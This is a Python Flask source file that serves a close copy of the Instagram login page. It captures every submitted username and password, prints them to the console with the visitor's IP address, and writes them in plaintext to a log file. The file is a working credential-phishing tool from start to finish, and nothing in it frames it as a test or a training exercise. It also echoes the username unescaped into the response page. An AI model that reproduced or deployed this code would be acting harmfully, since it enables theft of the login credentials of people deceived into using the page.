from flask import Flask, request, render_template_string, url_for
import datetime
from colorama import init, Fore, Style

init(autoreset=True)  # Initialize colorama

app = Flask(__name__)

# ---------- Original HTML with static image URL ----------
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
body {
  font-family:'Arial',sans-serif;
  background-color:#fafafa;
  margin:0;
  padding:0;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.container { display:flex; justify-content:center; align-items:center; width:100%; max-width:900px; background-color:white; border:1px solid #dbdbdb; border-radius:8px; }
.left { padding:20px; width:50%; display:flex; justify-content:center; align-items:center; }
.left img { max-width:100%; height:auto; border-radius:10px; }
.right { padding:40px; width:50%; display:flex; flex-direction:column; align-items:center; }
.logo img { width:175px; margin-bottom:20px; }
.form { width:100%; max-width:300px; display:flex; flex-direction:column; align-items:center; }
.input_field { margin-bottom:10px; width:100%; }
.input_field input { width:100%; padding:10px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; }
.btn button { width:100%; background-color:#3897f0; color:white; padding:10px; border:none; border-radius:3px; font-weight:bold; cursor:pointer; }
.or { display:flex; align-items:center; margin:10px 0; width:100%; max-width:300px; }
.or .line { flex:1; height:1px; background-color:#dbdbdb; }
.or p { margin:0 10px; font-weight:bold; color:#8e8e8e; }
.dif { display:flex; flex-direction:column; align-items:center; width:100%; margin-top:10px; }
.dif .fb { display:flex; align-items:center; justify-content:center; color:#385185; font-weight:bold; margin-bottom:8px; }
.dif .fb img { margin-right:5px; }
.forgot a { color:#00376b; text-decoration:none; }
.signup, .apps, .footer { margin-top:20px; text-align:center; font-size:14px; color:#8e8e8e; }
.apps .icons img { width:120px; margin:5px; }
.footer .links ul { display:flex; flex-wrap:wrap; justify-content:center; list-style:none; padding:0; margin:0; }
.footer .links ul li { margin:0 5px; }
.footer .links ul li a { color:#00376b; text-decoration:none; font-size:12px; }
.copyright { margin-top:10px; font-size:12px; color:#8e8e8e; }
</style>
</head>
<body>
<div class="container">
  <div class="left">
    <img src="{{ url_for('static', filename='Insta.png') }}" alt="Instagram Mockup">
  </div>
  <div class="right">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/175px-Instagram_logo.svg.png" alt="Instagram Logo">
    </div>
    <div class="form">
      <form method="POST" action="/login" autocomplete="off">
        <div class="input_field">
          <input name="username" type="text" placeholder="Phone number, username, or email" required>
        </div>
        <div class="input_field">
          <input name="password" type="password" placeholder="Password" required>
        </div>
        <div class="btn">
          <button type="submit">Log In</button>
        </div>
      </form>
    </div>
    <div class="or">
      <div class="line"></div><p>OR</p><div class="line"></div>
    </div>
    <div class="dif">
      <div class="fb">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" style="width:20px;">
        <p>Log in with Facebook</p>
      </div>
      <div class="forgot"><a href="#">Forgot password?</a></div>
    </div>
    <div class="signup">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    <div class="apps">
      <p>Get the app.</p>
      <div class="icons">
        <a href="#"><img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store"></a>
        <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"></a>
      </div>
    </div>
    <div class="footer">
      <div class="links">
        <ul>
          <li><a href="#">Meta</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Blog</a></li>
          <li><a href="#">Jobs</a></li>
          <li><a href="#">Help</a></li>
          <li><a href="#">API</a></li>
          <li><a href="#">Privacy</a></li>
          <li><a href="#">Terms</a></li>
          <li><a href="#">Locations</a></li>
          <li><a href="#">Instagram Lite</a></li>
          <li><a href="#">Meta AI</a></li>
          <li><a href="#">Threads</a></li>
        </ul>
      </div>
      <div class="copyright">© 2025 INSTAGRAM</div>
    </div>
  </div>
</div>
</body>
</html>"""

# ---------- Pretty colored console box ----------
def pretty_box(username, password, ip="unknown"):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        f"{Fore.YELLOW} LOGIN ATTEMPT ",
        f"{Fore.CYAN} Time : {now}",
        f" IP   : {ip}",
        f"{Fore.GREEN} User : {username}",
        f"{Fore.RED} Pass : {password}{Style.RESET_ALL}"
    ]
    width = max(len(Style.strip(line)) for line in lines) + 4
    top = "╔" + "═"*width + "╗"
    bottom = "╚" + "═"*width + "╝"
    middle = "\n".join(f"║ {line.ljust(width-2)} ║" for line in lines)
    return f"\n{top}\n{middle}\n{bottom}\n"

# ---------- Routes ----------
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "<empty>")
    password = request.form.get("password", "<empty>")
    ip = request.remote_addr or "unknown"

    box = pretty_box(username, password, ip)
    print(box)

    with open("login_attempts.log", "a") as f:
        f.write(f"{datetime.datetime.now()} - {ip} - {username} - {password}\n")

    return f"<h2>Login attempt received for <strong>{username}</strong></h2>"

# ---------- Run Server ----------
if __name__ == "__main__":
    import os
    os.environ.pop("FLASK_ENV", None)
    app.run(host="127.0.0.1", port=5001, debug=False, use_reloader=False)

